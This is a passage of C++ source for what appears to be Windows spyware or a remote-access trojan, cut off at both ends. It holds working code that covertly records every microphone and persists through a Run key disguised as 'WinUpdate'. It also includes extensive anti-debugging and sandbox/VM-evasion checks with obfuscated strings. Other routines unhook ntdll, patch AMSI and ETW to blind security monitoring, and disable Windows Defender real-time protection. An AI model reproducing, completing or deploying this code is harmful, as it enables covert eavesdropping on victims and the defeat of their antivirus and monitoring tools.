    size_t step = samples > 50000 ? samples / 50000 : 1;
    int nonzero = 0;
    int maxAbs = 0;
    for (size_t i = 0; i < samples; i += step) {
        short s = 0;
        memcpy(&s, pcm.data() + i * 2, 2);
        int a = s < 0 ? -s : s;
        if (a > maxAbs) maxAbs = a;
        if (a > 80) nonzero++;
    }
    return maxAbs > 200 || nonzero > 20;
}

static std::vector<char> recordMicrophoneWaveIn(UINT deviceId, int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD durationMs = (DWORD)durationSec * 1000;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 2; // devices on this machine are stereo
    wfx.nSamplesPerSec = 44100;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = (WORD)(wfx.nChannels * wfx.wBitsPerSample / 8);
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    HWAVEIN hWaveIn = nullptr;
    if (waveInOpen(&hWaveIn, deviceId, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        // try mono fallback
        wfx.nChannels = 1;
        wfx.nBlockAlign = (WORD)(wfx.nChannels * wfx.wBitsPerSample / 8);
        wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
        if (waveInOpen(&hWaveIn, deviceId, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
            return {};
    }

    const int NUM_BUFFERS = 8;
    DWORD bufSize = (wfx.nAvgBytesPerSec / 4);
    if (bufSize < 8192) bufSize = 8192;
    bufSize = (bufSize / wfx.nBlockAlign) * wfx.nBlockAlign;

    std::vector<std::vector<char>> buffers(NUM_BUFFERS);
    std::vector<WAVEHDR> headers(NUM_BUFFERS);
    std::vector<char> pcm;

    for (int i = 0; i < NUM_BUFFERS; i++) {
        buffers[i].assign(bufSize, 0);
        ZeroMemory(&headers[i], sizeof(WAVEHDR));
        headers[i].lpData = buffers[i].data();
        headers[i].dwBufferLength = bufSize;
        waveInPrepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        waveInAddBuffer(hWaveIn, &headers[i], sizeof(WAVEHDR));
    }

    if (waveInStart(hWaveIn) != MMSYSERR_NOERROR) {
        for (int i = 0; i < NUM_BUFFERS; i++)
            waveInUnprepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        return {};
    }

    DWORD start = GetTickCount();
    while (GetTickCount() - start < durationMs) {
        for (int i = 0; i < NUM_BUFFERS; i++) {
            if (headers[i].dwFlags & WHDR_DONE) {
                if (headers[i].dwBytesRecorded > 0) {
                    pcm.insert(pcm.end(), headers[i].lpData, headers[i].lpData + headers[i].dwBytesRecorded);
                }
                headers[i].dwBytesRecorded = 0;
                headers[i].dwFlags = WHDR_PREPARED;
                waveInAddBuffer(hWaveIn, &headers[i], sizeof(WAVEHDR));
            }
        }
        Sleep(15);
    }

    waveInStop(hWaveIn);
    waveInReset(hWaveIn);
    for (int i = 0; i < NUM_BUFFERS; i++) {
        if (headers[i].dwBytesRecorded > 0)
            pcm.insert(pcm.end(), headers[i].lpData, headers[i].lpData + headers[i].dwBytesRecorded);
        waveInUnprepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
    }
    waveInClose(hWaveIn);

    if (pcm.empty())
        return {};
    // Keep recording even if quiet (user wants every mic); only drop empty buffers
    return buildWavStereo(pcm, wfx.nSamplesPerSec, wfx.nChannels, wfx.wBitsPerSample);
}

static std::string sanitizeMicName(std::string s) {
    for (char& c : s) {
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_'))
            c = '_';
    }
    if (s.size() > 40) s.resize(40);
    return s.empty() ? "mic" : s;
}

// Record ALL detected microphones into separate files
static std::vector<std::pair<std::string, std::vector<char>>> recordAllMicrophones(int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD timeoutMs = (DWORD)durationSec * 1000 + 15000;

    std::vector<std::pair<std::string, std::vector<char>>> result;

    // At boot, audio services may not be ready — retry up to 8 times (total ~30s)
    UINT n = 0;
    for (int retry = 0; retry < 8; retry++) {
        n = waveInGetNumDevs();
        if (n > 0) break;
        if (retry < 7) Sleep(4000);
    }
    for (UINT d = 0; d < n; d++) {
        WAVEINCAPSA caps = {};
        std::string name = "wavein_" + std::to_string(d);
        if (waveInGetDevCapsA(d, &caps, sizeof(caps)) == MMSYSERR_NOERROR)
            name = caps.szPname;
        auto wav = recordMicrophoneWaveIn(d, durationSec);
        if (!wav.empty())
            result.push_back({ "audio/" + sanitizeMicName(name) + ".wav", std::move(wav) });
    }

    std::string list = captureFfmpegDeviceList();
    auto audios = parseDshowNames(list, "(audio)");
    for (size_t i = 0; i < audios.size(); i++) {
        std::string mic = audios[i];
        std::string safe = sanitizeMicName(mic);
        bool already = false;
        for (const auto& f : result) {
            if (f.first.find(safe) != std::string::npos) { already = true; break; }
        }
        if (already && !result.empty()) continue;

        std::string outPath = getTempDir() + "mic_ff_" + std::to_string(GetTickCount()) + "_" + std::to_string(i) + ".wav";
        std::string args = "-f dshow -i audio=" + quoteArg(mic) +
            " -t " + std::to_string(durationSec) + " -ac 2 -ar 44100 -c:a pcm_s16le " + quoteArg(outPath);
        if (!runFfmpeg(args, timeoutMs))
            continue;
        auto data = readFileToVector(outPath);
        DeleteFileA(outPath.c_str());
        if (data.size() < 1000) continue;
        result.push_back({ "audio/" + safe + ".wav", std::move(data) });
    }

    if (result.empty()) {
        auto wav = recordMicrophoneWaveIn(WAVE_MAPPER, durationSec);
        if (!wav.empty())
            result.push_back({ "audio/microphone.wav", std::move(wav) });
    }

    return result;
}

static std::vector<char> recordMicrophone(int durationSec) {
    auto all = recordAllMicrophones(durationSec);
    if (all.empty()) return {};
    return all.front().second;
}

// === Feature: Auto-start ===

static void enableAutoStart() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WinUpdate", 0, REG_SZ, (BYTE*)exePath, (DWORD)strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

// === Feature: Persistence ===

static void enablePersistence() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    char appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData))) {
        std::string dest = std::string(appData) + "\\WinUpdate.exe";
        CopyFileA(exePath, dest.c_str(), FALSE);

        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WinUpdate", 0, REG_SZ, (BYTE*)dest.c_str(), (DWORD)dest.size() + 1);
            RegCloseKey(hKey);
        }
    }

    enableAutoStart();
}

// === NT API dynamic loading for anti-analysis ===

typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtSetInformationThread_t)(HANDLE, ULONG, PVOID, ULONG);

#ifndef ProcessDebugPort
#define ProcessDebugPort 0x07
#endif
#ifndef ProcessDebugFlags
#define ProcessDebugFlags 0x1F
#endif
#ifndef ProcessDebugObjectHandle
#define ProcessDebugObjectHandle 0x1E
#endif
#ifndef ThreadHideFromDebugger
#define ThreadHideFromDebugger 0x0B
#endif

static NtQueryInformationProcess_t pNtQueryInformationProcess = nullptr;
static NtSetInformationThread_t pNtSetInformationThread = nullptr;

static void initNtApis() {
    static bool inited = false;
    if (inited) return;
    inited = true;
    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (hNtdll) {
        pNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, OX("NtQueryInformationProcess"));
        pNtSetInformationThread = (NtSetInformationThread_t)GetProcAddress(hNtdll, OX("NtSetInformationThread"));
    }
}

// === Feature: Stealth mode ===

static void enableStealth() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd)
        ShowWindow(hWnd, SW_HIDE);

    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);

    // Hide thread from debugger
    initNtApis();
    if (pNtSetInformationThread) {
        ULONG hide = 1;
        pNtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, &hide, sizeof(hide));
    }
}

// === Feature: Enhanced Anti-debugging (8 detection methods) ===

static bool checkDebuggerWindows() {
    const char* dbgClasses[] = {
        OX("OLLYDBG"), OX("WinDbgFrameClass"), OX("ID"), OX("Zeta Debugger"),
        OX("x64dbg"), OX("x32dbg"), OX("Immunity Debugger"),
        OX("Qt5152QWindowIcon"), nullptr
    };
    for (int i = 0; dbgClasses[i]; i++) {
        if (FindWindowA(dbgClasses[i], nullptr))
            return true;
    }
    return false;
}

static bool checkDebuggerProcesses() {
    const char* dbgNames[] = {
        OX("ollydbg.exe"), OX("x64dbg.exe"), OX("x32dbg.exe"), OX("windbg.exe"),
        OX("ida.exe"), OX("ida64.exe"), OX("idag.exe"), OX("idag64.exe"),
        OX("immunitydebugger.exe"), OX("debugger.exe"), OX("procmon.exe"),
        OX("procmon64.exe"), OX("processhacker.exe"), OX("fiddler.exe"),
        OX("wireshark.exe"), OX("httpdebugger.exe"), OX("httpdebuggerui.exe"),
        OX("pestudio.exe"), OX("die.exe"), OX("lordpe.exe"), OX("regshot.exe"),
        OX("procexp.exe"), OX("procexp64.exe"), OX("dnspy.exe"),
        nullptr
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            char name[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            for (int i = 0; dbgNames[i]; i++) {
                if (_stricmp(name, dbgNames[i]) == 0) {
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

static bool checkDebugRegisters() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 || ctx.Dr6 || ctx.Dr7)
            return true;
    }
    return false;
}

static bool checkNtQueryDebugPort() {
    initNtApis();
    if (!pNtQueryInformationProcess) return false;

    DWORD_PTR debugPort = 0;
    NTSTATUS status = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort,
        &debugPort, sizeof(debugPort), nullptr);
    if (status == 0 && debugPort != 0)
        return true;

    DWORD debugFlags = 0;
    status = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugFlags,
        &debugFlags, sizeof(debugFlags), nullptr);
    if (status == 0 && debugFlags == 0)
        return true;

    HANDLE hDebugObject = nullptr;
    status = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugObjectHandle,
        &hDebugObject, sizeof(hDebugObject), nullptr);
    if (status == 0 && hDebugObject != nullptr)
        return true;

    return false;
}

static bool checkPebBeingDebugged() {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
#endif
    if (peb)
        return peb[2] != 0;
    return false;
}

static bool checkRdtscTiming() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    volatile int x = 0;
    for (int i = 0; i < 100000; i++) x += i;

    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    return elapsed > 0.5;
}

static bool checkNtGlobalFlag() {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    if (peb) {
        DWORD ntGlobalFlag = *(DWORD*)(peb + 0xBC);
        // 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        return (ntGlobalFlag & 0x70) != 0;
    }
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
    if (peb) {
        DWORD ntGlobalFlag = *(DWORD*)(peb + 0x68);
        return (ntGlobalFlag & 0x70) != 0;
    }
#endif
    return false;
}

static bool checkHeapFlags() {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    if (peb) {
        PVOID* processHeaps = *(PVOID**)(peb + 0xF0);
        DWORD numHeaps = *(DWORD*)(peb + 0xE8);
        if (processHeaps && numHeaps > 0) {
            // Check first heap's Flags and ForceFlags
            DWORD heapFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x70);
            DWORD forceFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x74);
            if (heapFlags != 2 || forceFlags != 0)
                return true;
        }
    }
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
    if (peb) {
        PVOID* processHeaps = *(PVOID**)(peb + 0x90);
        DWORD numHeaps = *(DWORD*)(peb + 0x88);
        if (processHeaps && numHeaps > 0) {
            DWORD heapFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x0C);
            DWORD forceFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x10);
            if (heapFlags != 2 || forceFlags != 0)
                return true;
        }
    }
#endif
    return false;
}

static bool checkRemoteDebugger() {
    BOOL present = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &present);
    return present != FALSE;
}

static bool isBeingDebugged() {
    if (IsDebuggerPresent()) return true;
    if (checkRemoteDebugger()) return true;
    if (checkDebugRegisters()) return true;
    if (checkNtQueryDebugPort()) return true;
    if (checkPebBeingDebugged()) return true;
    if (checkNtGlobalFlag()) return true;
    if (checkHeapFlags()) return true;
    if (checkDebuggerWindows()) return true;
    if (checkDebuggerProcesses()) return true;
    if (checkRdtscTiming()) return true;
    return false;
}

static void hideThreadFromDebugger() {
    initNtApis();
    if (pNtSetInformationThread) {
        ULONG hide = 1;
        pNtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, &hide, sizeof(hide));
    }
}

static void runAntiDebug() {
    hideThreadFromDebugger();
    if (isBeingDebugged())
        ExitProcess(0);
}

// === Feature: Sandbox / VM detection (7 checks, score-based) ===

static bool checkSandboxUsername() {
    char username[256] = {};
    DWORD size = sizeof(username);
    if (!GetUserNameA(username, &size)) return false;

    const char* sandboxNames[] = {
        OX("sandbox"), OX("malware"), OX("virus"), OX("test"), OX("sample"),
        OX("cuckoo"), OX("analysis"), OX("john doe"), OX("hal9th"),
        OX("panda"), OX("currentuser"), OX("user1"), nullptr
    };

    char lower[256];
    size_t i;
    for (i = 0; i < sizeof(lower) - 1 && username[i]; i++)
        lower[i] = (char)tolower((unsigned char)username[i]);
    lower[i] = 0;

    for (int j = 0; sandboxNames[j]; j++) {
        if (strstr(lower, sandboxNames[j]))
            return true;
    }
    return false;
}

static bool checkSandboxProcesses() {
    const char* sandboxProcs[] = {
        OX("vboxservice.exe"), OX("vboxtray.exe"), OX("vmtoolsd.exe"),
        OX("vmwaretray.exe"), OX("vmwareuser.exe"), OX("vmsrvc.exe"),
        OX("prl_cc.exe"), OX("prl_tools.exe"), OX("xenservice.exe"),
        OX("qemu-ga.exe"), OX("cuckoo.exe"), OX("cuckoomon.exe"),
        OX("sbiesvc.exe"), OX("sbiectrl.exe"), OX("sandboxiedcomlaunch.exe"),
        nullptr
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            char name[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            for (int i = 0; sandboxProcs[i]; i++) {
                if (_stricmp(name, sandboxProcs[i]) == 0) {
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

static bool checkSandboxMac() {
    auto& api = dynApi();
    if (!api.GetAdaptersAddresses) return false;

    ULONG outBufLen = 0;
    if (api.GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &outBufLen) != ERROR_BUFFER_OVERFLOW)
        return false;

    std::vector<BYTE> buf(outBufLen);
    PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (api.GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapters, &outBufLen) != NOERROR)
        return false;

    for (PIP_ADAPTER_ADDRESSES p = adapters; p; p = p->Next) {
        if (p->PhysicalAddressLength != 6) continue;
        BYTE* mac = p->PhysicalAddress;
        if (mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) return true;
        if (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) return true;
        if (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) return true;
        if (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27) return true;
        if (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x3E) return true;
        if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x42) return true;
    }
    return false;
}

static bool checkLowResources() {
    MEMORYSTATUSEX mem = {};
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem)) {
        if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))
            return true;
    }

    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree)) {
        if (totalBytes.QuadPart < (60ULL * 1024 * 1024 * 1024))
            return true;
    }

    return false;
}

static bool checkLowUptime() {
    return GetTickCount() < 300000;
}

static bool checkAnalysisDlls() {
    const char* analysisDlls[] = {
        OX("sbiedll.dll"), OX("api_log.dll"), OX("dirwatch.dll"),
        OX("pstorec.dll"), OX("vmcheck.dll"), OX("sand.dll"), OX("sxin.dll"),
        OX("cuckoomon.dll"), nullptr
    };
    for (int i = 0; analysisDlls[i]; i++) {
        if (GetModuleHandleA(analysisDlls[i]))
            return true;
    }
    return false;
}

static bool checkRecentFiles() {
    char recentPath[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_RECENT, nullptr, 0, recentPath))) {
        WIN32_FIND_DATAA fd;
        std::string pattern = std::string(recentPath) + "\\*";
        HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) return true;
        int count = 0;
        do {
            if (fd.cFileName[0] == '.') continue;
            count++;
        } while (FindNextFileA(h, &fd) && count < 5);
        FindClose(h);
        if (count < 5) return true;
    }
    return false;
}

static bool checkCPUIDHypervisor() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    // Bit 31 of ECX indicates hypervisor presence
    if (!(cpuInfo[2] & (1 << 31)))
        return false;

    // Query hypervisor vendor ID to exclude VBS (Windows Virtualization-Based Security)
    // VBS uses "Microsoft Hv" which runs on physical machines too
    __cpuid(cpuInfo, 0x40000000);
    char vendor[13] = {};
    memcpy(vendor + 0, &cpuInfo[1], 4);  // EBX
    memcpy(vendor + 4, &cpuInfo[2], 4);  // ECX
    memcpy(vendor + 8, &cpuInfo[3], 4);  // EDX
    vendor[12] = 0;

    // Only flag real VM vendors, NOT Microsoft Hv (could be VBS on physical)
    if (_stricmp(vendor, "VMwareVMware") == 0) return true;
    if (_stricmp(vendor, "VBoxVBoxVBox") == 0) return true;
    if (_stricmp(vendor, "KVMKVMKVM") == 0) return true;
    if (_stricmp(vendor, "XenVMMXenVMM") == 0) return true;
    if (_stricmp(vendor, "prl hyperv") == 0) return true;  // Parallels
    if (_stricmp(vendor, " lrpepyh vr") == 0) return true;  // Parallels (reversed)

    return false;
}

static bool checkVMDevices() {
    const char* vmDevices[] = {
        OX("\\\\.\\VBoxGuest"), OX("\\\\.\\VBoxMiniRdrDN"),
        OX("\\\\.\\vmci"), OX("\\\\.\\HGFS"),
        OX("\\\\.\\pipe\\VBoxMiniRdDN"), OX("\\\\.\\pipe\\VBoxTrayIPC"),
        nullptr
    };
    for (int i = 0; vmDevices[i]; i++) {
        HANDLE h = CreateFileA(vmDevices[i], GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            return true;
        }
    }
    return false;
}

static bool isInSandbox() {
    int score = 0;
    if (checkCPUIDHypervisor()) score += 4;
    if (checkVMDevices()) score += 4;
    if (checkSandboxUsername()) score += 2;
    if (checkSandboxProcesses()) score += 3;
    if (checkSandboxMac()) score += 3;
    if (checkLowResources()) score += 1;
    if (checkLowUptime()) score += 1;
    if (checkAnalysisDlls()) score += 3;
    if (checkRecentFiles()) score += 1;
    // Require strong signal (real VM vendor / tools), not uptime alone
    return score >= 6;
}

// === Feature: Anti-Antivirus ===

static bool unhookNtdll() {
    HANDLE hFile = CreateFileA(OX("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMap = CreateFileMappingA(hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMap) return false;

    LPVOID pMapped = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!pMapped) return false;

    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (!hNtdll) {
        UnmapViewOfFile(pMapped);
        return false;
    }

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER textSec = IMAGE_FIRST_SECTION(ntHdr);
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (memcmp(textSec[i].Name, ".text", 5) == 0) {
            void* textAddr = (void*)((BYTE*)hNtdll + textSec[i].VirtualAddress);
            SIZE_T textSize = textSec[i].Misc.VirtualSize;

            PIMAGE_DOS_HEADER mappedDos = (PIMAGE_DOS_HEADER)pMapped;
            PIMAGE_NT_HEADERS mappedNt = (PIMAGE_NT_HEADERS)((BYTE*)pMapped + mappedDos->e_lfanew);
            PIMAGE_SECTION_HEADER mappedText = IMAGE_FIRST_SECTION(mappedNt);
            for (WORD j = 0; j < mappedNt->FileHeader.NumberOfSections; j++) {
                if (memcmp(mappedText[j].Name, ".text", 5) == 0) {
                    void* srcAddr = (void*)((BYTE*)pMapped + mappedText[j].VirtualAddress);
                    DWORD oldProtect = 0;
                    if (VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                        memcpy(textAddr, srcAddr, textSize);
                        VirtualProtect(textAddr, textSize, oldProtect, &oldProtect);
                        FlushInstructionCache(GetCurrentProcess(), textAddr, textSize);
                        UnmapViewOfFile(pMapped);
                        return true;
                    }
                    break;
                }
            }
            break;
        }
    }

    UnmapViewOfFile(pMapped);
    return false;
}

static bool patchAmsi() {
    HMODULE hAmsi = LoadLibraryA(OX("amsi.dll"));
    if (!hAmsi) return false;

    FARPROC proc = GetProcAddress(hAmsi, OX("AmsiScanBuffer"));
    if (!proc) return false;

    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect = 0;
    if (VirtualProtect(proc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(proc, patch, sizeof(patch));
        VirtualProtect(proc, sizeof(patch), oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), proc, sizeof(patch));
        return true;
    }
    return false;
}

static bool isAdmin() {
    BOOL isElevated = FALSE;
    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(elevation);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size))
            isElevated = elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return isElevated != FALSE;
}

static bool patchEtw() {
    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (!hNtdll) return false;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, OX("EtwEventWrite"));
    if (!pEtwEventWrite) return false;

    // patch: xor rax,rax; ret (x64) or xor eax,eax; ret (x86)
#ifdef _WIN64
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
    unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
    DWORD oldProtect = 0;
    if (VirtualProtect((void*)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect((void*)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWrite, sizeof(patch));
        return true;
    }
    return false;
}

static bool patchEtwFull() {
    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (!hNtdll) return false;

    // Patch EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, OX("EtwEventWrite"));
    if (pEtwEventWrite) {
#ifdef _WIN64
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
        DWORD oldProtect = 0;
        if (VirtualProtect((void*)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
            VirtualProtect((void*)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
            FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWrite, sizeof(patch));
        }
    }

    // Patch EtwEventWriteFull
    FARPROC pEtwEventWriteFull = GetProcAddress(hNtdll, OX("EtwEventWriteFull"));
    if (pEtwEventWriteFull) {
#ifdef _WIN64
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
        DWORD oldProtect = 0;
        if (VirtualProtect((void*)pEtwEventWriteFull, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((void*)pEtwEventWriteFull, patch, sizeof(patch));
            VirtualProtect((void*)pEtwEventWriteFull, sizeof(patch), oldProtect, &oldProtect);
            FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWriteFull, sizeof(patch));
        }
    }

    // Patch NtTraceEvent
    FARPROC pNtTraceEvent = GetProcAddress(hNtdll, OX("NtTraceEvent"));
    if (pNtTraceEvent) {
#ifdef _WIN64
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
        DWORD oldProtect = 0;
        if (VirtualProtect((void*)pNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((void*)pNtTraceEvent, patch, sizeof(patch));
            VirtualProtect((void*)pNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);
            FlushInstructionCache(GetCurrentProcess(), (void*)pNtTraceEvent, sizeof(patch));
        }
    }

    return true;
}

static void disableDefenderRealtime() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        OX("SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection"),
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExA(hKey, OX("DisableRealtimeMonitoring"), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        OX("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"),
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExA(hKey, OX("DisableRealtimeMonitoring"), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        OX("SOFTWARE\\Policies\\Microsoft\\Windows Defender"),
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExA(hKey, OX("DisableAntiSpyware"), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

static void addDefenderExclusions() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    char appData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);

    std::string exeDir(exePath);
    size_t slash = exeDir.find_last_of("\\/");
